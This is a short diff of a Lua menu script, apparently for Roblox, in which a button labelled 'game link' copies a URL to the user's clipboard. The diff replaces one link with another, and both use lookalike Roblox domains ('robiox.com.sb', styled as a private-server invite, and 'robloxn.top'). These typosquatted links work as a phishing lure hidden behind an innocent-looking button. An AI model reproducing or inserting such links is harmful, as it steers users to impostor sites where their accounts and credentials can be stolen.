@@ -73,7 +73,7 @@ Callback = <function> - The function of the button.
 
 Tab:AddButton({
 	Name = "game link",
-	Callback = function()setclipboard("https://www.robiox.com.sb/games/116495829188952/Dead-Rails-Alpha?privateServerLinkCode=222436499449396313042475794625")
+	Callback = function()setclipboard("https://www.robloxn.top/communities/318552382217/RCM Games")
       		print("button pressed")
   	end    
 })
